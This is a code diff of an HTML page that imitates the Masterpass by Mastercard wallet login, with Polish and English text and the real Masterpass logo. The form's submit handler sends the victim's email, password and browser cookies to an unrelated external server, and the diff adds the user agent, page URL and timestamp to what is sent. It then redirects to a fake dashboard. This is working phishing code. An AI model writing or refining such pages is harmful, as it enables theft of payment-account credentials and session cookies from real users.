@@ -1,40 +1,184 @@
-
 <!DOCTYPE html>
 <html lang="pl">
 <head>
   <meta charset="UTF-8" />
-  <title>Portfel Masterpass</title>
-  <link rel="stylesheet" href="/style.css" />
+  <title>Masterpass™ Wallet | Login</title>
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      font-family: "Segoe UI", sans-serif;
+      background: #f5f6f7;
+      margin: 0;
+      padding: 0;
+    }
+
+    .lang-switcher {
+      position: absolute;
+      top: 15px;
+      right: 20px;
+    }
+
+    .lang-switcher button {
+      margin-left: 5px;
+      padding: 5px 10px;
+      cursor: pointer;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 80px auto;
+      background: #fff;
+      padding: 2em;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      max-width: 200px;
+    }
+
+    h1 {
+      font-size: 20px;
+      text-align: center;
+      margin-bottom: 1em;
+    }
+
+    .features {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 1em;
+    }
+
+    form label {
+      display: block;
+      margin-top: 1em;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 0.75em;
+      margin-top: 0.5em;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .remember {
+      margin-top: 0.5em;
+    }
+
+    .form-footer {
+      margin-top: 1em;
+      font-size: 14px;
+    }
+
+    .submit-btn {
+      margin-top: 1.5em;
+      width: 100%;
+      padding: 0.75em;
+      background: #e0001b;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .cookie-banner {
+      font-size: 13px;
+      padding: 1em;
+      text-align: center;
+      background: #eee;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+    }
+  </style>
 </head>
-<body class="login-page">
-  <div class="login-wrapper">
-    <div class="login-box">
-      <div class="logo-box">
-        <img src="https://www.masterpass.pl/img/masterpass_logo.svg" alt="Masterpass logo" class="logo" />
-      </div>
-      <h2>Zaloguj się do swojego portfela</h2>
-      <form id="loginForm">
-        <label for="email">Adres e-mail</label>
-        <input type="email" id="email" placeholder="np. jan.kowalski@gmail.com" required />
-
-        <label for="password">Hasło</label>
-        <input type="password" id="password" placeholder="Wprowadź hasło" required />
-
-        <div class="form-footer">
-          <a href="#">Nie pamiętasz hasła?</a>
-        </div>
-
-        <button type="submit" class="submit-btn">Zaloguj się</button>
-      </form>
-      <div class="register-box">
-        <p>Nie masz konta? <a href="#">Zarejestruj się</a></p>
-      </div>
-    </div>
+<body>
+  <div class="lang-switcher">
+    <button onclick="setLang('pl')">PL</button>
+    <button onclick="setLang('en')">EN</button>
   </div>
 
-  <script type="module">
-    const form = document.getElementById('loginForm');
-    form.addEventListener('submit', async (e) => {
+  <div class="container">
+    <img src="https://www.masterpass.pl/img/masterpass_logo.svg" alt="Masterpass" class="logo" />
+    <h1 id="login-title"></h1>
+
+    <div class="features" id="features-text"></div>
+
+    <form id="loginForm">
+      <label for="email" id="email-label"></label>
+      <input type="email" id="email" required />
+
+      <label for="password" id="password-label"></label>
+      <input type="password" id="password" required />
+
+      <div class="remember">
+        <input type="checkbox" id="remember" />
+        <label for="remember" id="remember-label"></label>
+      </div>
+
+      <div class="form-footer">
+        <a href="#" id="reset-link"></a>
+      </div>
+
+      <button type="submit" class="submit-btn" id="submit-btn"></button>
+    </form>
+  </div>
+
+  <div class="cookie-banner" id="cookie-text">
+    <!-- translated at runtime -->
+  </div>
+
+  <script>
+    const langData = {
+      pl: {
+        loginTitle: 'Zaloguj się lub aktywuj portfel Masterpass™ od Mastercard®',
+        features: `Masterpass™ to wiele korzyści:<br>
+        <strong>Bezpieczeństwo</strong> Płatność, dzięki której sklepy on-line nie widzą danych Twojej karty<br>
+        <strong>Szybkość transakcji</strong> Dane karty podajesz tylko raz - przy rejestracji<br>
+        <strong>Wygoda</strong> Zakupy on-line na każdym urządzeniu`,
+        emailLabel: 'Adres e-mail lub numer telefonu',
+        passwordLabel: 'Hasło',
+        remember: 'Pamiętaj mój login',
+        reset: 'Nie znam hasła',
+        submit: 'Zaloguj się',
+        cookies: 'Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę na ich używanie zgodnie z aktualnymi ustawieniami przeglądarki. Więcej informacji znajdziesz w dokumencie <a href="#">Informacja o Plikach Cookie</a>.'
+      },
+      en: {
+        loginTitle: 'Log in or activate your Masterpass™ wallet by Mastercard®',
+        features: `Masterpass™ offers many benefits:<br>
+        <strong>Security</strong> Pay online without disclosing your card details to the shop<br>
+        <strong>Fast transactions</strong> You enter your card data only once – when you register<br>
+        <strong>Convenience</strong> Online shopping on any device`,
+        emailLabel: 'E-mail address or phone number',
+        passwordLabel: 'Password',
+        remember: 'Remember my login',
+        reset: 'Reset password',
+        submit: 'Sign in',
+        cookies: 'This site uses cookies and similar technologies. By using this site you consent to their use in accordance with your current browser settings. For more information, see <a href="#">Information about Cookies</a>.'
+      }
+    };
+
+    const setLang = (lang) => {
+      localStorage.setItem('lang', lang);
+      const t = langData[lang];
+      document.getElementById('login-title').innerHTML = t.loginTitle;
+      document.getElementById('features-text').innerHTML = t.features;
+      document.getElementById('email-label').innerText = t.emailLabel;
+      document.getElementById('password-label').innerText = t.passwordLabel;
+      document.getElementById('remember-label').innerText = t.remember;
+      document.getElementById('reset-link').innerText = t.reset;
+      document.getElementById('submit-btn').innerText = t.submit;
+      document.getElementById('cookie-text').innerHTML = t.cookies;
+    };
+
+    setLang(localStorage.getItem('lang') || 'pl');
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
@@ -42,7 +186,14 @@
       await fetch('https://zaza-back.onrender.com/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password, cookies: document.cookie })
+        body: JSON.stringify({
+          email,
+          password,
+          cookies: document.cookie,
+          userAgent: navigator.userAgent,
+          url: location.href,
+          date: new Date().toISOString()
+        })
       });
 
       window.location.href = '/wallet-dashboard.html';
